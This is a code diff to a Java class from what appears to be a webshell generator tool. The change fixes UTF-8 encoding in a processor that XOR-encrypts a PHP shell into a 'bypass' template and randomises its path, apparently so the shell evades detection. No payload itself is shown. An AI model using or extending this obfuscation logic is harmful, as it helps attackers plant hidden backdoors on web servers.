@@ -17,7 +17,7 @@ import util.Log;
 import util.functions;
 
 @GenerateProcessor(
-    DisplayName = "PHP ȫ�汾�����ļ�������include_once��",
+    DisplayName = "PHP 全版本常量文件包含（include_once）",
     superTemplate = {"php"}
 )
 public class PhpConstInclude implements ShellProcessor {
@@ -66,7 +66,7 @@ public class PhpConstInclude implements ShellProcessor {
     public static String BypassReplace(String data, String pass) {
         try {
             InputStream inputStream = Generate.class.getResourceAsStream("template/templatebypass.bin");
-            String code = new String(functions.readInputStream(inputStream));
+            String code = new String(functions.readInputStream(inputStream), StandardCharsets.UTF_8);
             inputStream.close();
             data = code.replace("8WRl51GXKPkn8kusti7u8M8zWg==", xorEncrypt(data, pass));
             data = data.replace("MYPATH", generateRandomString(true));
@@ -93,16 +93,16 @@ public class PhpConstInclude implements ShellProcessor {
         if (shell == null || shell.length == 0) {
             return shell == null ? new byte[0] : shell;
         }
-        String content = new String(shell);
+        String content = new String(shell, StandardCharsets.UTF_8);
         String pass = extractPass(content);
-        return BypassReplace(content, pass).getBytes();
+        return BypassReplace(content, pass).getBytes(StandardCharsets.UTF_8);
     }
 
     public byte[] doProcessor(byte[] shell, String suffix, String pass) {
         if (shell == null || shell.length == 0) {
             return shell == null ? new byte[0] : shell;
         }
-        return BypassReplace(new String(shell), pass == null ? "" : pass).getBytes();
+        return BypassReplace(new String(shell, StandardCharsets.UTF_8), pass == null ? "" : pass).getBytes(StandardCharsets.UTF_8);
     }
 
     /** 从已替换 {pass} 的 PHP 模板中提取密码。 */
